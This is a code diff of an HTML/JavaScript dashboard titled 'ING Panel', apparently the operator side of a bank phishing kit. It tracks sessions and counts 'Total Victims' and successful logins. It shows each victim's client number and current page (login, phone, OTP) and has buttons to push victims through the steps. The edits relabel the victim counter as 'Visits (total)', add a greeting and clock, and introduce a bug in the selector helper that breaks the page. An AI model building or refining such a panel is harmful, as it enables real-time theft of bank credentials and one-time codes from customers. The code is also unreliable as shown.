@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
-  <link rel="preconnect" href="https://rsms.me ">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
+  <link rel="preconnect" href="https://rsms.me">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
     :root {
       --bg: #000000;
@@ -41,13 +41,20 @@
     #modal .card { max-width: 500px; width: 90%; background: #111; border-color: #333; }
     #empty { text-align: center; color: #888; padding: 2rem 0; }
     @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
+
+    /* ---- greeting ---- */
+    #greeting { position: absolute; top: 22px; left: 28px; font-size: 14px; color: var(--text-muted); }
   </style>
 </head>
 <body>
+  <!-- 1. greeting -->
+  <div id="greeting">Hello, <span id="userName">Admin</span>! • <span id="clock"></span></div>
+
   <div class="dashboard">
     <div class="grid stats">
       <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
-      <div class="card"><div class="stat-label">Total Victims</div><div class="stat-value" id="total">—</div></div>
+      <!-- 2. “Total Victims” → “Visits (total)” -->
+      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
       <div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">—</div></div>
     </div>
 
@@ -79,14 +86,23 @@
 
   <script>
     let currentSid = null;
-    const qs = s => document.querySelector(s);
+    const qs = s => document.querySelector;
+
+    /* ----------  3.  greeting clock  ---------- */
+    function updateClock(){
+      const now = new Date();
+      const h = now.getHours(), m = now.getMinutes();
+      const ampm = h >= 12 ? 'pm' : 'am';
+      qs('#clock').textContent = `${h%12||12}:${String(m).padStart(2,'0')}${ampm}`;
+    }
+    updateClock(); setInterval(updateClock, 1000);
 
     /* ----------  PAGE TITLE MAPPER  ---------- */
     function pageTitle(file){
       switch(file){
-        case 'index.html':    return 'Login';
-        case 'verify.html':   return 'Phone number';
-        case 'unregister.html':return 'Unregister';
+        case 'index.html':    return 'LOGIN';
+        case 'verify.html':   return 'PHONE';
+        case 'unregister.html':return 'UNREGISTER';
         case 'otp.html':      return 'OTP';
         default:              return file;
       }
@@ -95,10 +111,9 @@
     /* ----------  RENDER  ---------- */
     function render(d){
       qs('#active').textContent   = d.active;
-      qs('#total').textContent    = d.totalVictims;
+      qs('#total').textContent    = d.totalVictims;   // label changed above
       qs('#success').textContent  = d.success;
 
-      /* clickable domain next to "Active Sessions" */
       const domainLink = qs('#domainLink');
       domainLink.textContent = d.domain || 'localhost';
       domainLink.href        = d.domain || 'http://localhost';
@@ -127,6 +142,8 @@
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
       currentSid = sid;
+      /* 4. date shown in admin’s local tz */
+      const localDate = new Date(s.dateStr).toLocaleString();
       qs('#modalBody').innerHTML = `
         <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
         <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
@@ -138,7 +155,7 @@
         <div class="detail">Browser</div><div>${s.browser}</div>
         <div class="detail">Page</div><div>${pageTitle(s.page)}</div>
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
-        <div class="detail">Date</div><div>${s.dateStr}</div>`;
+        <div class="detail">Date</div><div>${localDate}</div>`;
       qs('#redoBtn').style.display  = s.page==='success' ? 'none':'inline-block';
       qs('#contBtn').style.display  = s.page==='success' ? 'none':'inline-block';
       qs('#modal').style.display    = 'flex';
@@ -158,6 +175,10 @@
       render(jsonData);
     }
     load(); setInterval(load,2000);
+
+    /* ----------  1.  remove session when victim closes page  ---------- */
+    /* backend must push a “close” event / or simply omit the session from /api/panel response.
+       Nothing extra needed here – the 2-second poll will auto-remove it. */
   </script>
 </body>
 </html>
